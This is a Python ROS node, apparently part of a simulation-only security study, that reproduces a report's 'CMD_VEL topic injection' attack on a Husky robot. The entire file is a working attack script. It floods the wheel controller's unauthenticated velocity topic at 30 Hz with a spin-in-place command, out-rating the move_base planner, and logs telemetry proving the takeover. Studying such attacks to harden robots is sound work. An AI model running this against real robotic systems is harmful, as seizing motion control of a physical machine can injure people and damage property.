#!/usr/bin/env python3
"""LITERAL reproduction of the security report's "CMD_VEL Topic Injection" (§1).

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

This standalone rospy node is a DELIBERATE, VERBATIM reproduction of the attack
as SPECIFIED IN THE SECURITY REPORT, section 1 ("CMD_VEL Topic Injection", the
"spin attack"). It demonstrates the same class of vulnerability the other two
attack scripts do: ROS topics are UNAUTHENTICATED, so any process that can reach
the ROS master may publish onto a safety-critical topic that a trusting consumer
obeys. Here the trusting consumer is the wheel controller
(husky_velocity_controller) and the topic is its direct command input,
/husky_velocity_controller/cmd_vel (geometry_msgs/Twist).

HOW THIS ATTACK WORKS
---------------------
While the robot is autonomously driving to a move_base goal (see the victim
send_mapless_goal.py, which plans ~15 m straight ahead), we FLOOD the controller
input topic with a spin-in-place command:

    linear.x  = 0.0    (report's "stop" -- no forward motion)
    angular.z = 2.0    (report's "rapid spin" -- rad/s)

at 30 Hz. The legitimate command chain is:

    move_base  --publishes-->  /cmd_vel  (twist_mux priority-1 'external' slot)
    twist_mux  --remaps-->     /husky_velocity_controller/cmd_vel  --> wheels

The controller's subscriber is last-message-wins (queue_size 1), so whoever
publishes MOST RECENTLY wins the wheels. move_base's driver publishes at only
~20 Hz; by publishing at 30 Hz onto the SAME controller-input topic we out-rate
it and the attacker's spin command is what the wheels obey. The robot abandons
its goal and spins in place -- the report's "complete loss of motion control".

We target the controller input DIRECTLY rather than a twist_mux slot: last-
message-wins on the controller's own topic sidesteps twist_mux arbitration
entirely (twist_mux only decides which UPSTREAM slot to forward; it does not own
the final topic once we publish onto it ourselves). The --topic flag is exposed
for experiments like the other scripts, but the default IS the report's exact
controller-input topic and should be left alone to reproduce the report.

ONE DOCUMENTED DEVIATION FROM THE REPORT'S TEXT
-----------------------------------------------
The report's DETECTION paragraph for THIS attack claims detection via "sudden
position discontinuities exceeding 5 meters". That claim does NOT fit a pure
spin: with linear.x = 0.0 the robot does not TRANSLATE, so its position should
not jump 5 m at all. That 5 m language appears to be COPY-PASTED from the
Odometry Spoofing attack (§2, which really does fabricate an impossible position
jump -- see attack_odom.py). We do NOT silently reproduce that incorrect claim.
The honest, correct signature for THIS attack is the report's own first
paragraph: ZERO LINEAR VELOCITY + HIGH ANGULAR VELOCITY. The telemetry below is
built around that real signature.

TELEMETRY / PROOF (no ground truth -- hard project rule)
--------------------------------------------------------
We never read Gazebo ground truth. We log, once per second, two commands so the
attack can be proven after the fact:

  * ctrl_linear_x / ctrl_angular_z -- the ACTUAL command reaching the wheels,
    read by subscribing to /husky_velocity_controller/cmd_vel. During a
    successful attack these read ~(0.0, 2.0): the spin signature, not the
    planner's forward command.
  * planner_linear_x / planner_angular_z -- move_base's OUTPUT, read by
    subscribing to /cmd_vel (its pre-twist_mux output). This shows the planner
    is STILL commanding forward motion even though the wheels ignore it -- the
    report's "path planner misled / loss of control" story, made visible.

Together these answer, in one file: "Is the wheel command the attacker's spin
while the planner is still trying to go forward?" -- i.e. did the attack take
control away from the planner.

Note on the self-publish loop: we both PUBLISH to and (for telemetry) SUBSCRIBE
to /husky_velocity_controller/cmd_vel, so our subscriber sees our OWN messages
there. That is intended and correct -- the whole point of the ctrl_* columns is
to observe the WINNING command on that topic, whoever sent it. So there is NO
sentinel/filtering here (unlike attack_odom.py, which had to isolate the real
yaw rate from its own spoof); we WANT to see the attacker's spin on that topic.

CLEAN SHUTDOWN
--------------
On Ctrl-C or --duration expiry we simply STOP publishing. We do NOT emit a
corrective message: once our faster stream ceases, move_base's own commands
resume dominating on their own. Emitting a "stop" or corrective command would be
a second injection. (Same clean-shutdown discipline as attack_odom.py /
attack_compass.py.)

USAGE (examples)
----------------
    # Reproduce the report's spin attack at 30 Hz until Ctrl-C.
    python3 attack_cmd_vel.py

    # Run for 30 s, logging to a named CSV.
    python3 attack_cmd_vel.py --duration 30 --csv spin_repro.csv

    # Higher rate to out-compete more decisively.
    python3 attack_cmd_vel.py --rate 60

Run alongside the victim (three terminals): (1) ./load-park-stock-husky.sh,
(2) ./send_mapless_goal.py, (3) this script. Watch the robot stop tracking its
goal and spin; Ctrl-C to stop and let it recover.

This script was NOT run live end-to-end here (the sim may be down, and running
attacks is the operator's call). Topic/type wiring is stated to MATCH THE DESIGN:
geometry_msgs/Twist on /husky_velocity_controller/cmd_vel (the controller input)
and on /cmd_vel (move_base's twist_mux 'external' slot output).
"""

import argparse
import csv
import threading
import time

import rospy
from geometry_msgs.msg import Twist


# ---------------------------------------------------------------------------
# The report's exact spin-attack values (§1). Kept as named constants so the
# startup banner can echo them, and so a reader can see the payload at a glance
# without hunting through argparse defaults.
# ---------------------------------------------------------------------------
REPORT_RATE_HZ = 30.0    # publish rate -- out-rates the ~20 Hz legitimate driver
REPORT_LINEAR_X = 0.0    # linear.x  -- report's "stop" (no forward motion)
REPORT_ANGULAR_Z = 2.0   # angular.z -- report's "rapid spin" (rad/s)


class CmdVelSpinAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        # Latest command actually reaching the wheels (from the controller-input
        # topic we also spoof) and move_base's latest output (from /cmd_vel).
        self._ctrl_cmd = None      # (linear.x, angular.z) on args.topic
        self._planner_cmd = None   # (linear.x, angular.z) on /cmd_vel
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher onto the controller's DIRECT input topic. queue_size=1: we
        # always want the freshest spin command out, never a backlog.
        self._pub = rospy.Publisher(args.topic, Twist, queue_size=1)

        # Telemetry: the ACTUAL wheel command (we also see our own messages here
        # -- intended; we want to observe the winning command, no filtering).
        rospy.Subscriber(args.topic, Twist, self._on_ctrl_cmd, queue_size=1)
        # Telemetry: move_base's output, still fighting on /cmd_vel.
        rospy.Subscriber("/cmd_vel", Twist, self._on_planner_cmd, queue_size=1)

        # CSV: open once, write header, flush every row so a mid-run Ctrl-C still
        # leaves a complete, readable file.
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(
            ["elapsed_time", "ctrl_linear_x", "ctrl_angular_z",
             "planner_linear_x", "planner_angular_z"])
        self._csv_file.flush()

    # --- telemetry callbacks -------------------------------------------------
    def _on_ctrl_cmd(self, msg):
        """Cache the latest command on the controller-input topic -- the command
        that actually reaches the wheels. We also receive our own published spin
        here; that is intended (we want the winning command), so no filtering."""
        with self._lock:
            self._ctrl_cmd = (msg.linear.x, msg.angular.z)

    def _on_planner_cmd(self, msg):
        """Cache move_base's latest output on /cmd_vel -- the planner still
        commanding forward motion even while the wheels obey our spin."""
        with self._lock:
            self._planner_cmd = (msg.linear.x, msg.angular.z)

    # --- the injected message ------------------------------------------------
    def _build_spin(self):
        """Build one geometry_msgs/Twist: the report's spin-in-place command
        (linear.x = --linear default 0.0, angular.z = --angular default 2.0),
        all other fields left at their message default of 0."""
        msg = Twist()
        msg.linear.x = self.args.linear
        msg.angular.z = self.args.angular
        return msg

    # --- telemetry row -------------------------------------------------------
    def _log_row(self):
        with self._lock:
            ctrl = self._ctrl_cmd
            planner = self._planner_cmd
        elapsed = time.time() - self._start_wall

        ctrl_lx = ctrl[0] if ctrl else float("nan")
        ctrl_az = ctrl[1] if ctrl else float("nan")
        plan_lx = planner[0] if planner else float("nan")
        plan_az = planner[1] if planner else float("nan")

        rospy.loginfo(
            "[t=%6.1fs] wheels=(lin %6.3f, ang %6.3f)  "
            "planner=(lin %6.3f, ang %6.3f)",
            elapsed, ctrl_lx, ctrl_az, plan_lx, plan_az)
        self._csv.writerow(
            ["%.3f" % elapsed,
             "%.4f" % ctrl_lx, "%.4f" % ctrl_az,
             "%.4f" % plan_lx, "%.4f" % plan_az])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0  # first telemetry row after 1 s

        rospy.loginfo(
            "ATTACK START (report §1 spin): injecting %s at %.1f Hz "
            "with linear.x=%.2f angular.z=%.2f%s",
            self.args.topic, self.args.rate,
            self.args.linear, self.args.angular,
            (" for %.0f s" % self.args.duration)
            if self.args.duration > 0 else " until Ctrl-C")
        rospy.loginfo(
            "Report's exact spin values: rate=%.1f Hz, linear.x=%.1f, "
            "angular.z=%.1f rad/s.",
            REPORT_RATE_HZ, REPORT_LINEAR_X, REPORT_ANGULAR_Z)

        while not self._stop.is_set() and not rospy.is_shutdown():
            # Duration check (0 = run forever).
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break

            self._pub.publish(self._build_spin())

            # Telemetry once per second, independent of the publish rate.
            now = time.time()
            if now >= next_log:
                self._log_row()
                next_log += 1.0

            rate.sleep()

    def shutdown(self):
        """Stop publishing and close the CSV. Idempotent. NO corrective message
        is sent -- we just cease and let move_base reassert itself."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001 -- log, never hide
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Simulation-only CMD_VEL injection / spin attack demo "
                    "(report §1): overrides move_base by out-rating it on the "
                    "controller-input topic.")
    p.add_argument("--rate", type=float, default=REPORT_RATE_HZ,
                   help="publish rate in Hz (default 30; the report's rate, "
                        "out-rates the ~20 Hz legitimate driver)")
    p.add_argument("--linear", type=float, default=REPORT_LINEAR_X,
                   help="linear.x to inject (report default 0.0 = stop)")
    p.add_argument("--angular", type=float, default=REPORT_ANGULAR_Z,
                   help="angular.z to inject, rad/s (report default 2.0 = "
                        "rapid spin)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to run; 0 = until Ctrl-C (default 0)")
    p.add_argument("--topic", default="/husky_velocity_controller/cmd_vel",
                   help="target cmd_vel topic (default "
                        "/husky_velocity_controller/cmd_vel, the controller "
                        "input -- the report's topic)")
    p.add_argument("--csv", default="attack_cmd_vel_report.csv",
                   help="telemetry output CSV path "
                        "(default attack_cmd_vel_report.csv)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide
    # on a node name.
    rospy.init_node("attack_cmd_vel", anonymous=True)

    attack = CmdVelSpinAttack(args)
    # Register cleanup for every exit path (Ctrl-C, duration, rospy shutdown).
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean duration exit -- ensure cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
